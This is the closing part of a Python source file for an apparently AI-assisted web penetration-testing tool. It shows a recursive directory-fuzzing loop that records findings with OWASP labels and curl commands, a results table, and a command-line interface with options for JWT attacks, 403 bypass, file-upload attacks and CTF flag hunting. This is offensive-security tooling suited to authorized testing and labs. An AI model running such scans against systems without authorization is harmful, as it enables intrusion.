                        lines       = hit.get("lines", 0),
                        body        = body,
                        profile     = cur_profile,
                    )

                    v_type      = verdict.get("type", "unknown")
                    v_risk      = verdict.get("risk", "Info")
                    v_reason    = verdict.get("reason", "")
                    v_is_dir    = verdict.get("is_directory", False)
                    v_sensitive = verdict.get("is_sensitive", False)
                    v_conf      = verdict.get("confidence", 0)

                    color = {"Critical":"bold red","High":"red","Medium":"yellow",
                             "Low":"cyan","Info":"dim"}.get(v_risk,"dim")

                    console.print(
                        f"  [{color}]  {hit_status} {hit_url}[/{color}]  "
                        f"[dim]size={hit_size}  type={v_type}  "
                        f"risk={v_risk}  conf={v_conf}%[/dim]"
                    )
                    if v_reason:
                        console.print(f"  [dim]    AI: {v_reason}[/dim]")

                    # Real finding?
                    if v_sensitive and v_conf >= MIN_CONFIDENCE:
                        f = Finding(
                            owasp_id   = verdict.get("owasp_id", "A05"),
                            owasp_name = verdict.get("owasp_name", "Security Misconfiguration"),
                            title      = verdict.get("title", f"Exposed: {hit_url}"),
                            risk       = v_risk,
                            confidence = v_conf,
                            url        = hit_url,
                            method     = "GET",
                            param      = "URL_PATH",
                            payload    = "",
                            evidence   = v_reason,
                            baseline_diff = f"status={hit_status} size={hit_size}",
                            tool_output   = body[:300],
                            request_raw   = f"GET {hit_url} HTTP/1.1",
                            response_raw  = body[:400],
                            exploit_cmd   = f"curl -v \'{hit_url}\'",
                            remediation   = verdict.get("remediation", "Restrict access."),
                        )
                        findings.append(f)
                        console.print(
                            f"  [bold {color}]  🎯 FINDING: {f.title[:60]}[/bold {color}]"
                        )

                    # Rekursiv — papka topilsa keyingi qatlamga
                    if v_is_dir and current_depth < max_depth:
                        new_dir = hit_url.rstrip("/")
                        if new_dir not in visited_dirs:
                            queue_dirs.append(new_dir)
                            console.print(f"  [dim]    ↳ queued for recursive fuzz: {new_dir}[/dim]")

            current_depth += 1

        return findings

    def _print_summary(self, findings: list[Finding]):
        by_risk = collections.defaultdict(list)
        for f in findings:
            by_risk[f.risk].append(f)
        if HAS_RICH:
            t = Table(title="📊 Final Results", box=box.ROUNDED)
            t.add_column("Risk",  width=10)
            t.add_column("OWASP", width=6)
            t.add_column("Title", style="dim")
            t.add_column("Conf",  width=6)
            t.add_column("✓",    width=4)
            colors = {"Critical":"bold red","High":"red","Medium":"yellow","Low":"cyan","Info":"dim"}
            for risk in ["Critical","High","Medium","Low","Info"]:
                for f in by_risk.get(risk, []):
                    c = colors.get(risk, "white")
                    t.add_row(f"[{c}]{risk}[/{c}]", f.owasp_id, f.title[:55],
                              f"{f.confidence}%", "✅" if f.confirmed else "")
            console.print(t)
        else:
            for f in findings:
                print(f"  [{f.risk}] {f.owasp_id} — {f.title} ({f.confidence}%)")


# ─────────────────────────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Pentest AI v7.0 MEGA — OWASP Top 10 · OOB · Playwright · CTF",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Examples:
  python3 pentest_ai.py -t http://target.lab
  python3 pentest_ai.py -t http://10.10.10.5 --ctf --deep
  python3 pentest_ai.py -t http://app.lab -a /login -u admin -p admin123
  python3 pentest_ai.py -t http://app.lab -a /login -u user -p pass -U admin -P secret
  python3 pentest_ai.py -t http://target.com --oob --playwright
  python3 pentest_ai.py -t http://htb.lab --ctf --oob --deep
""")
    # Target
    parser.add_argument("--target",     "-t", required=True,  help="Target URL / IP / domain")
    # Auth
    parser.add_argument("--auth-url",   "-a", default="",     help="Login endpoint path")
    parser.add_argument("--user",       "-u", default="",     help="Low-priv username")
    parser.add_argument("--password",   "-p", default="",     help="Low-priv password")
    parser.add_argument("--admin-user", "-U", default="",     help="Admin username")
    parser.add_argument("--admin-pass", "-P", default="",     help="Admin password")
    # Mode
    parser.add_argument("--mode", "-m", default="full",
                        choices=["full","web","api","spa","quick"],
                        help="Scan mode (default: full)")
    parser.add_argument("--deep",       action="store_true",  help="Deep scan — more endpoints, recursive")
    # V7 MEGA flags
    parser.add_argument("--ctf",        action="store_true",  help="CTF mode — flag.txt hunt, exploit chains")
    parser.add_argument("--oob",        action="store_true",  help="Enable OOB blind detection (interactsh)")
    parser.add_argument("--playwright", action="store_true",  help="Use Playwright browser for JS/SPA crawl")
    parser.add_argument("--no-nuclei",  action="store_true",  help="Skip Nuclei CVE scan")
    parser.add_argument("--no-403",     action="store_true",  help="Skip recursive 403 bypass")
    parser.add_argument("--no-upload",  action="store_true",  help="Skip file upload attack")
    parser.add_argument("--jwt",        default="",           help="JWT token to attack directly")
    parser.add_argument("--ws",         default="",           help="WebSocket URL to test e.g. ws://target/chat")
    # Recon
    parser.add_argument("--ports",      default="",           help="Specific ports to scan e.g. 80,443,8080")
    parser.add_argument("--recon-only", action="store_true",  help="Run recon only, no fuzzing")
    parser.add_argument("--tools",      action="store_true",  help="Show installed tools and exit")
    # Output / model
    parser.add_argument("--output", "-o", default="",        help="Output report directory")
    parser.add_argument("--model",        default="",        help="Override Ollama model")

    args = parser.parse_args()

    if args.tools:
        _print_tools_status()
        return

    if args.recon_only:
        ai    = AIEngine()
        recon = ReconEngine(ai)
        result = recon.run(args.target)
        console.print("\n[bold]HTTP Targets found:[/bold]")
        for t in result.http_targets:
            console.print(f"  {t['url']}")
        return

    # Standalone JWT attack
    if args.jwt:
        from types import SimpleNamespace
        dummy = SimpleNamespace(target=args.target, mode="full", deep=False,
                                auth_url="", user="", password="",
                                admin_user="", admin_pass="", ctf=False, oob=False)
        pipeline = PentestPipeline(dummy)
        attacker = JWTAttacker(pipeline.client, pipeline.oob)
        findings = attacker.attack(args.jwt, [{"url": args.target}])
        console.print(f"\n[bold]JWT Results:[/bold] {len(findings)} findings")
        for f in findings:
            console.print(f"  [{f.risk}] {f.title}")
        return

    # Standalone WebSocket test
    if args.ws:
        ai      = AIEngine()
        tester  = WebSocketTester(ai)
        findings = tester.test(args.ws)
        console.print(f"\n[bold]WebSocket Results:[/bold] {len(findings)} findings")
        for f in findings:
            console.print(f"  [{f.risk}] {f.title}")
        return

    signal.signal(signal.SIGINT, lambda s, f: (
        console.print("\n[yellow]Interrupted — partial results saved[/yellow]"), sys.exit(0)
    ))

    PentestPipeline(args).run()


if __name__ == "__main__":
    main()
